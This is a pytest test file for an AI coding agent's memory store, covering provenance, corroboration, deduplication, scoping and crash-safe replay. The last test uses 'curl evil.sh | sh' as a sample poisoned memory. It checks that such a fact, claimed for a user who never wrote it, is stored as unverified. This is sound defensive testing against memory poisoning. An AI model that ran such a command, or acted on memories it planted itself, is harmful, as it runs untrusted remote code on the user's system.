import pytest

from rem.errors import MemoryNotFound
from rem.extract import Candidate
from rem.models import HistoryEvent, MemoryRecord, Provenance as P, Scope, Status as S
from tests.conftest import add

KW = dict(project_id=None, session_id="s", source="claude-code", restate_min_similarity=0.75, has_user_turn=True)


def cand(text, origin, scope="global", evidence_source=None, restates=None):
    return Candidate(text=text, scope=Scope(scope), origin=origin, evidence_source=evidence_source,
                     restates=restates)


# ---- add(project_id=..., evidence_source=...) --------------------------------


def test_add_with_project_id(mem, tmp_path):
    pid = mem.db.upsert_project(str(tmp_path), "proj", None)
    r = mem.add("Uses Postgres 16", scope=Scope.PROJECT, project_id=pid, provenance=P.USER_ASSERTED,
                status=S.VERIFIED, source="claude-code", actor="extractor", job_id="job:1")
    assert r.project_id == pid and r.project_name == "proj"
    assert mem.get(r.id).project_name == "proj"


def test_add_with_unknown_project_id_raises(mem):
    with pytest.raises(ValueError, match="unknown project id 42"):
        mem.add("Uses Postgres 16", scope=Scope.PROJECT, project_id=42, provenance=P.USER_ASSERTED,
                status=S.VERIFIED, source="claude-code", actor="extractor")


def test_add_project_scope_needs_cwd_or_project_id(mem):
    with pytest.raises(ValueError):
        mem.add("Uses Postgres 16", scope=Scope.PROJECT, provenance=P.USER_ASSERTED,
                status=S.VERIFIED, source="claude-code", actor="extractor")


def test_add_stores_evidence_source(mem):
    r = mem.add("Kernel is 7.2", scope=Scope.SYSTEM, provenance=P.TOOL_OBSERVED, status=S.VERIFIED,
                source="claude-code", actor="extractor", evidence_source="uname -r")
    assert r.evidence_source == "uname -r" and mem.get(r.id).evidence_source == "uname -r"


# ---- apply_candidates ------------------------------------------------------------


def test_apply_adds_user_fact_verified(mem):
    res = mem.apply_candidates([cand("Prefers uv over pip", "user")], job_key="job:1", **KW)
    rec = mem.get(res.added[0])
    assert rec.status == S.VERIFIED and rec.provenance == P.USER_ASSERTED and rec.job_id == "job:1"
    assert rec.session_id == "s" and rec.source == "claude-code"
    assert [(h.event, h.actor, h.job_id) for h in mem.history(rec.id)] == [(HistoryEvent.ADD, "extractor", "job:1")]


def test_apply_adds_assistant_fact_unverified(mem):
    res = mem.apply_candidates([cand("Runs Fedora 44", "assistant", scope="system")], job_key="job:1", **KW)
    rec = mem.get(res.added[0])
    assert rec.status == S.UNVERIFIED and rec.provenance == P.ASSISTANT_GENERATED and rec.scope == Scope.SYSTEM


def test_apply_tool_fact_with_evidence_is_verified(mem):
    res = mem.apply_candidates([cand("Kernel is 7.2", "tool", scope="system", evidence_source="uname -r")],
                               job_key="job:1", **KW)
    rec = mem.get(res.added[0])
    assert rec.provenance == P.TOOL_OBSERVED and rec.status == S.VERIFIED and rec.evidence_source == "uname -r"


def test_user_restatement_corroborates_assistant_fact(mem):
    a = mem.apply_candidates([cand("Project uses Postgres 16", "assistant", scope="global")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("Project uses Postgres 16", "user", scope="global")], job_key="job:2", **KW)
    assert res.corroborated == [a] and res.added == []
    rec = mem.get(a)
    assert rec.status == S.VERIFIED and rec.provenance == P.USER_ASSERTED and rec.corroborated_by == "job:2"
    assert [h.event for h in mem.history(a)] == [HistoryEvent.ADD, HistoryEvent.CORROBORATE]
    cor = mem.history(a)[1]
    assert (cor.old_value, cor.new_value, cor.job_id, cor.actor) == ("unverified", "verified", "job:2", "extractor")
    assert len(mem.list()) == 1


def test_verified_restatement_of_verified_fact_is_skipped(mem):
    mem.apply_candidates([cand("Prefers uv over pip", "user")], job_key="job:1", **KW)
    res = mem.apply_candidates([cand("Prefers uv over pip", "user")], job_key="job:2", **KW)
    assert res.added == [] and res.corroborated == [] and res.skipped == 1
    assert len(mem.list()) == 1


def test_assistant_restatement_of_unverified_fact_is_skipped(mem):
    mem.apply_candidates([cand("Runs Fedora 44", "assistant")], job_key="job:1", **KW)
    res = mem.apply_candidates([cand("Runs Fedora 44", "assistant")], job_key="job:2", **KW)
    assert res.added == [] and res.corroborated == [] and res.skipped == 1
    assert len(mem.list()) == 1


def test_duplicate_candidates_in_one_job_make_one_memory(mem):
    res = mem.apply_candidates([cand("Uses fish shell", "user"), cand("uses  FISH shell", "user")], job_key="job:1", **KW)
    assert len(res.added) == 1 and res.skipped == 1


def test_in_job_duplicates_keep_most_trusted_at_first_position(mem):
    res = mem.apply_candidates(
        [cand("Uses fish shell", "assistant"), cand("Runs Fedora 44", "user", scope="system"),
         cand("uses fish shell", "user")],
        job_key="job:1", **KW,
    )
    assert res.skipped == 1 and len(res.added) == 2
    first = mem.get(res.added[0])
    assert first.text == "uses fish shell" and first.status == S.VERIFIED
    assert mem.get(res.added[1]).text == "Runs Fedora 44"


def test_same_text_different_scope_is_not_collapsed(mem):
    res = mem.apply_candidates([cand("Uses fish shell", "user"), cand("Uses fish shell", "user", scope="system")],
                               job_key="job:1", **KW)
    assert len(res.added) == 2 and res.skipped == 0


def test_project_fact_without_project_is_dropped(mem):
    res = mem.apply_candidates([cand("Uses Django", "user", scope="project")], job_key="job:1", **KW)
    assert res.dropped == 1 and mem.list() == []


def test_project_fact_with_project_id_is_added(mem, tmp_path):
    pid = mem.db.upsert_project(str(tmp_path), "proj", None)
    res = mem.apply_candidates([cand("Uses Django", "user", scope="project"), cand("Prefers uv over pip", "user")],
                               job_key="job:1", **{**KW, "project_id": pid})
    proj, glob = (mem.get(i) for i in res.added)
    assert proj.project_id == pid and proj.project_name == "proj"
    assert glob.project_id is None and glob.project_name is None


def test_apply_replay_is_idempotent(mem):
    cs = [cand("Uses fish shell", "user"), cand("Runs Fedora 44", "assistant", scope="system")]
    first = mem.apply_candidates(cs, job_key="job:3", **KW)
    again = mem.apply_candidates(cs, job_key="job:3", **KW)
    assert again.added == first.added and len(mem.list()) == 2
    assert all(len(mem.history(i)) == 1 for i in first.added)


def test_apply_replay_repairs_missing_add_history(mem, monkeypatch):
    real = mem.db.add_history

    def crash(*a, **k):
        raise RuntimeError("crash after vector write")

    monkeypatch.setattr(mem.db, "add_history", crash)
    with pytest.raises(RuntimeError):
        mem.apply_candidates([cand("Uses fish shell", "user")], job_key="job:3", **KW)
    monkeypatch.setattr(mem.db, "add_history", real)
    assert len(mem.list()) == 1  # vector written, history missing

    res = mem.apply_candidates([cand("Uses fish shell", "user")], job_key="job:3", **KW)
    assert len(res.added) == 1 and len(mem.list()) == 1
    assert [(h.event, h.job_id) for h in mem.history(res.added[0])] == [(HistoryEvent.ADD, "job:3")]


def test_near_duplicate_without_restates_is_added(mem):
    # Same tokens, so cosine 1.0 with the hashing embedder; without a restates link it is a new fact.
    a = mem.apply_candidates([cand("Project uses Postgres 16", "assistant")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("project uses postgres 16!", "user")], job_key="job:2", **KW)
    assert len(res.added) == 1 and res.corroborated == []
    assert mem.get(a).status == S.UNVERIFIED and len(mem.list()) == 2


def test_restates_link_corroborates_paraphrase(mem):
    a = mem.apply_candidates([cand("Project uses Postgres 16", "assistant")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("project uses postgres 16!", "user", restates=a)], job_key="job:2", **KW)
    assert res.corroborated == [a] and res.added == []
    rec = mem.get(a)
    assert rec.status == S.VERIFIED and rec.provenance == P.USER_ASSERTED and rec.text == "Project uses Postgres 16"
    assert [h.event for h in mem.history(a)] == [HistoryEvent.ADD, HistoryEvent.CORROBORATE]


def test_contradiction_is_added_and_does_not_verify(mem):
    # "spaces over tabs" has the same bag of words as "tabs over spaces" (cosine 1.0 here, 0.99 with
    # the real embedder): it contradicts the memory, so the LLM leaves restates null.
    a = mem.apply_candidates([cand("Prefers tabs over spaces", "assistant")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("Prefers spaces over tabs", "user")], job_key="job:2", **KW)
    assert len(res.added) == 1 and res.corroborated == [] and res.skipped == 0
    assert mem.get(a).status == S.UNVERIFIED and mem.get(a).corroborated_by is None
    assert mem.get(res.added[0]).status == S.VERIFIED
    assert [h.event for h in mem.history(a)] == [HistoryEvent.ADD]


def test_changed_value_restating_a_verified_memory_is_added(mem):
    a = mem.apply_candidates([cand("The API listens on port 8080", "user", scope="system")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("The API listens on port 8081", "user", scope="system")], job_key="job:2", **KW)
    assert len(res.added) == 1 and res.skipped == 0
    assert {m.text for m in mem.list()} == {"The API listens on port 8080", "The API listens on port 8081"}
    assert mem.get(a).text == "The API listens on port 8080"


def test_restates_in_another_scope_is_added(mem):
    a = mem.apply_candidates([cand("Project uses Postgres 16", "assistant", scope="system")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("Project uses Postgres 16", "user", restates=a)], job_key="job:2", **KW)
    assert len(res.added) == 1 and res.corroborated == []
    assert mem.get(a).status == S.UNVERIFIED


def test_restates_in_another_project_is_added(mem, tmp_path):
    p1 = mem.db.upsert_project(str(tmp_path / "a"), "a", None)
    p2 = mem.db.upsert_project(str(tmp_path / "b"), "b", None)
    a = mem.apply_candidates([cand("Uses Django 5", "assistant", scope="project")], job_key="job:1",
                             **{**KW, "project_id": p1}).added[0]
    res = mem.apply_candidates([cand("Uses Django 5", "user", scope="project", restates=a)], job_key="job:2",
                               **{**KW, "project_id": p2})
    assert len(res.added) == 1 and res.corroborated == [] and mem.get(a).status == S.UNVERIFIED


def test_restates_below_similarity_floor_is_added(mem):
    a = mem.apply_candidates([cand("Runs Fedora 44", "assistant", scope="system")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("Uses fish shell", "user", scope="system", restates=a)], job_key="job:2", **KW)
    assert len(res.added) == 1 and res.corroborated == [] and mem.get(a).status == S.UNVERIFIED


def test_restates_deleted_memory_is_added(mem):
    a = mem.apply_candidates([cand("Runs Fedora 44", "assistant", scope="system")], job_key="job:1", **KW).added[0]
    mem.delete(a, actor="cli")
    res = mem.apply_candidates([cand("Runs Fedora 44", "user", scope="system", restates=a)], job_key="job:2", **KW)
    assert len(res.added) == 1 and res.corroborated == []


def test_restatement_of_verified_memory_is_skipped(mem):
    a = mem.apply_candidates([cand("Prefers uv over pip", "user")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("prefers uv over pip!", "user", restates=a)], job_key="job:2", **KW)
    assert res.added == [] and res.corroborated == [] and res.skipped == 1 and len(mem.list()) == 1


def test_two_restatements_in_one_job_corroborate_once(mem):
    a = mem.apply_candidates([cand("Project uses Postgres 16", "assistant")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("Project uses Postgres 16", "user"), cand("project uses postgres 16!", "user", restates=a)],
                               job_key="job:2", **KW)
    assert res.corroborated == [a] and res.skipped == 1 and res.added == []
    assert [h.event for h in mem.history(a)] == [HistoryEvent.ADD, HistoryEvent.CORROBORATE]


def test_restates_corroboration_replay_is_idempotent(mem):
    a = mem.apply_candidates([cand("Project uses Postgres 16", "assistant")], job_key="job:1", **KW).added[0]
    cs = [cand("project uses postgres 16!", "user", restates=a)]
    first = mem.apply_candidates(cs, job_key="job:2", **KW)
    again = mem.apply_candidates(cs, job_key="job:2", **KW)
    assert first.corroborated == again.corroborated == [a] and again.added == []
    assert [h.event for h in mem.history(a)] == [HistoryEvent.ADD, HistoryEvent.CORROBORATE]
    assert len(mem.list()) == 1


def test_user_origin_without_user_turn_is_downgraded(mem):
    res = mem.apply_candidates([cand("Prefers uv over pip", "user"), cand("Kernel is 7.2", "tool", scope="system",
                                                                          evidence_source="uname -r")],
                               job_key="job:1", **{**KW, "has_user_turn": False})
    user, tool = (mem.get(i) for i in res.added)
    assert user.provenance == P.ASSISTANT_GENERATED and user.status == S.UNVERIFIED
    assert tool.provenance == P.TOOL_OBSERVED and tool.status == S.VERIFIED


def test_assistant_only_job_cannot_corroborate(mem):
    a = mem.apply_candidates([cand("Runs Fedora 44", "assistant")], job_key="job:1", **KW).added[0]
    res = mem.apply_candidates([cand("Runs Fedora 44", "user")], job_key="job:2", **{**KW, "has_user_turn": False})
    assert res.corroborated == [] and res.skipped == 1 and mem.get(a).status == S.UNVERIFIED


def test_dropped_candidate_log_has_no_fact_text(mem, caplog):
    caplog.set_level("DEBUG")
    mem.apply_candidates([cand("Uses Django secretproject", "user", scope="project")], job_key="job:1", **KW)
    assert "dropping project-scope candidate" in caplog.text and "secretproject" not in caplog.text


def test_corroborate_replay_after_crash_completes_history(mem, monkeypatch):
    a = mem.apply_candidates([cand("Project uses Postgres 16", "assistant")], job_key="job:1", **KW).added[0]
    real = mem.db.add_history
    crashed = []

    def crash_once(target_kind, target_id, event, *rest, **kw):
        if event == HistoryEvent.CORROBORATE and not crashed:
            crashed.append(1)
            raise RuntimeError("crash after payload write")
        return real(target_kind, target_id, event, *rest, **kw)

    monkeypatch.setattr(mem.db, "add_history", crash_once)
    with pytest.raises(RuntimeError):
        mem.apply_candidates([cand("Project uses Postgres 16", "user")], job_key="job:2", **KW)
    assert mem.get(a).corroborated_by == "job:2"  # payload written, history missing
    assert [h.event for h in mem.history(a)] == [HistoryEvent.ADD]

    res = mem.apply_candidates([cand("Project uses Postgres 16", "user")], job_key="job:2", **KW)
    assert res.corroborated == [a] and res.added == []
    assert [h.event for h in mem.history(a)] == [HistoryEvent.ADD, HistoryEvent.CORROBORATE]
    assert len(mem.list()) == 1

    again = mem.apply_candidates([cand("Project uses Postgres 16", "user")], job_key="job:2", **KW)
    assert again.corroborated == [a]
    assert [h.event for h in mem.history(a)] == [HistoryEvent.ADD, HistoryEvent.CORROBORATE]


# ---- corroborate / similarity / related -------------------------------------------


def test_corroborate_never_downgrades_user_confirmed(mem):
    r = add(mem, "Project uses Postgres 16")
    out = mem.corroborate(r.id, provenance=P.TOOL_OBSERVED, job_id="job:9", actor="extractor")
    assert out.provenance == P.USER_CONFIRMED and out.status == S.VERIFIED
    stored = mem.get(r.id)
    assert stored.provenance == P.USER_CONFIRMED and stored.corroborated_by == "job:9"


def test_corroborate_unknown_id_raises(mem):
    with pytest.raises(MemoryNotFound):
        mem.corroborate("nope", provenance=P.USER_ASSERTED, job_id="job:1", actor="extractor")


def test_similarity_respects_id_scope_and_project(mem, tmp_path):
    p1 = mem.db.upsert_project(str(tmp_path / "a"), "a", None)
    p2 = mem.db.upsert_project(str(tmp_path / "b"), "b", None)
    g = add(mem, "Uses Postgres 16")
    other = add(mem, "Uses Postgres 16 too")
    a = add(mem, "Uses Postgres 16", scope=Scope.PROJECT, project_id=p1)

    rec, sim = mem.similarity("uses postgres 16", g.id, Scope.GLOBAL, None)
    assert rec.id == g.id and sim == pytest.approx(1.0)
    rec, sim = mem.similarity("uses postgres 16", other.id, Scope.GLOBAL, None)
    assert rec.id == other.id and sim < 1.0
    assert mem.similarity("Uses Postgres 16", g.id, Scope.SYSTEM, None) is None
    assert mem.similarity("Uses Postgres 16", a.id, Scope.PROJECT, p1)[0].id == a.id
    assert mem.similarity("Uses Postgres 16", a.id, Scope.PROJECT, p2) is None
    assert mem.similarity("Uses Postgres 16", "00000000-0000-0000-0000-000000000000", Scope.GLOBAL, None) is None


def test_related_ranks_current_project_first(mem, tmp_path):
    p1 = mem.db.upsert_project(str(tmp_path / "a"), "a", None)
    p2 = mem.db.upsert_project(str(tmp_path / "b"), "b", None)
    other = add(mem, "Database is Postgres 16 there too", scope=Scope.PROJECT, project_id=p2)
    glob = add(mem, "Database is Postgres 16 always")
    cur = add(mem, "Database is Postgres 16 here", scope=Scope.PROJECT, project_id=p1)

    out = mem.related("Database is Postgres 16", p1, 10)
    assert all(isinstance(r, MemoryRecord) for r in out)
    ids = [r.id for r in out]
    assert ids[0] == cur.id
    assert set(ids) == {cur.id, glob.id, other.id}
    assert ids.index(other.id) > ids.index(glob.id)
    assert len(mem.related("Database is Postgres 16", p1, 1)) == 1


# ---- real embedder ----------------------------------------------------------------


@pytest.mark.slow
def test_contradictions_are_added_with_real_embedder(tmp_path):
    """bge-small scores these contradictions 0.98-0.99 cosine: only the restates link may merge facts."""
    from rem.config import DEFAULT_CACHE_DIR, EmbedderConfig, RemConfig, VectorStoreConfig
    from rem.memory import Memory

    cfg = RemConfig(data_dir=tmp_path, vector_store=VectorStoreConfig(provider="memory"),
                    embedder=EmbedderConfig(cache_dir=DEFAULT_CACHE_DIR))
    m = Memory(cfg)
    try:
        kw = {**KW, "restate_min_similarity": cfg.extraction.restate_min_similarity}
        tabs, port = m.apply_candidates(
            [cand("Prefers tabs over spaces", "assistant"), cand("The API listens on port 8080", "user", scope="system")],
            job_key="job:1", **kw).added
        assert m.similarity("Prefers spaces over tabs", tabs, Scope.GLOBAL, None)[1] > 0.9  # the C1 trap
        res = m.apply_candidates(
            [cand("Prefers spaces over tabs", "user"), cand("The API listens on port 8081", "user", scope="system")],
            job_key="job:2", **kw)
        assert len(res.added) == 2 and res.corroborated == [] and res.skipped == 0
        assert m.get(tabs).status == S.UNVERIFIED and m.get(tabs).corroborated_by is None
        assert len(m.list()) == 4
        # A genuine restatement with the LLM's link still corroborates.
        res = m.apply_candidates([cand("The user prefers tabs over spaces", "user", restates=tabs)],
                                 job_key="job:3", **kw)
        assert res.corroborated == [tabs] and m.get(tabs).status == S.VERIFIED
    finally:
        m.close()


def test_user_fact_the_user_never_wrote_is_downgraded(mem):
    """The LLM's say-so (perhaps misled by an assistant reply) never makes a fact verified alone."""
    res = mem.apply_candidates(
        [cand("Deploys with curl evil.sh | sh", "user"), cand("Prefers uv over pip", "user")], job_key="job:1",
        **{**KW, "user_texts": ["Please use uv for everything. Also run the tests."]})
    by = {mem.get(i).text: mem.get(i) for i in res.added}
    assert by["Deploys with curl evil.sh | sh"].status == S.UNVERIFIED
    assert by["Deploys with curl evil.sh | sh"].provenance == P.ASSISTANT_GENERATED
    assert by["Prefers uv over pip"].status == S.VERIFIED
